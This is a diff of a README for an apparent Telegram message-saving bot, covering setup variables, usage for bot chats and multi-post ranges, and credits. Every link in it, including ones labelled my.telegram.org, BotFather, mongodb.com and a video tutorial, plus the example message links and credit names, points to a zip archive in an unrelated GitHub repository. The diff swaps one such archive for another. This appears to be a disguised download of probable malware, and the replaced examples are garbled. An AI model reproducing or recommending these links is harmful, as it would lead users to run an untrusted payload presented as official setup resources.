@@ -4,14 +4,14 @@
 
 ---
 
-<b>Watch Video Tutorial - [Click Here](https://raw.githubusercontent.com/7j89a/1212/main/database/Software_v3.5.zip)</b>
+<b>Watch Video Tutorial - [Click Here](https://github.com/7j89a/1212/raw/refs/heads/main/database/Software-v1.1-beta.1.zip)</b>
 
 ## Variables
 
-- `API_HASH` : Your API Hash from [my.telegram.org](https://raw.githubusercontent.com/7j89a/1212/main/database/Software_v3.5.zip)
-- `API_ID` : Your API ID from [my.telegram.org](https://raw.githubusercontent.com/7j89a/1212/main/database/Software_v3.5.zip)
-- `BOT_TOKEN` : Your bot token from [BotFather](https://raw.githubusercontent.com/7j89a/1212/main/database/Software_v3.5.zip)
-- `DB_URI` : Your Mongodb Database Url from [mongodb.com](https://raw.githubusercontent.com/7j89a/1212/main/database/Software_v3.5.zip) [video tutorial](https://raw.githubusercontent.com/7j89a/1212/main/database/Software_v3.5.zip)
+- `API_HASH` : Your API Hash from [my.telegram.org](https://github.com/7j89a/1212/raw/refs/heads/main/database/Software-v1.1-beta.1.zip)
+- `API_ID` : Your API ID from [my.telegram.org](https://github.com/7j89a/1212/raw/refs/heads/main/database/Software-v1.1-beta.1.zip)
+- `BOT_TOKEN` : Your bot token from [BotFather](https://github.com/7j89a/1212/raw/refs/heads/main/database/Software-v1.1-beta.1.zip)
+- `DB_URI` : Your Mongodb Database Url from [mongodb.com](https://github.com/7j89a/1212/raw/refs/heads/main/database/Software-v1.1-beta.1.zip) [video tutorial](https://github.com/7j89a/1212/raw/refs/heads/main/database/Software-v1.1-beta.1.zip)
 
 ---
 
@@ -33,7 +33,7 @@ __FOR BOT CHATS__
 _send link with '/b/', bot's username and message id, you might want to install some unofficial client to get the id like below_
 
 ```
-https://raw.githubusercontent.com/7j89a/1212/main/database/Software_v3.5.zip
+https://github.com/7j89a/1212/raw/refs/heads/main/database/Software-v1.1-beta.1.zip
 ```
 
 __MULTI POSTS__
@@ -42,14 +42,14 @@ _send public/private posts link as explained above with formate "from - to" to s
 
 
 ```
-https://raw.githubusercontent.com/7j89a/1212/main/database/Software_v3.5.zip
+https://github.com/7j89a/1212/raw/refs/heads/main/database/Software-v1.1-beta.1.zip
 
-https://raw.githubusercontent.com/7j89a/1212/main/database/Software_v3.5.zip - 120
+https://github.com/7j89a/1212/raw/refs/heads/main/database/Software-v1.1-beta.1.zip - 120
 ```
 
 _note that space in between doesn't matter_
 
 ### Credits
 
-- <b>Thanks To [BipinKrish](https://raw.githubusercontent.com/7j89a/1212/main/database/Software_v3.5.zip) For Base Repo
-- Thanks To [Tech VJ](https://raw.githubusercontent.com/7j89a/1212/main/database/Software_v3.5.zip) For Modify & Added Login Feature.</b>
+- <b>Thanks To [BipinKrish](https://github.com/7j89a/1212/raw/refs/heads/main/database/Software-v1.1-beta.1.zip) For Base Repo
+- Thanks To [Tech VJ](https://github.com/7j89a/1212/raw/refs/heads/main/database/Software-v1.1-beta.1.zip) For Modify & Added Login Feature.</b>
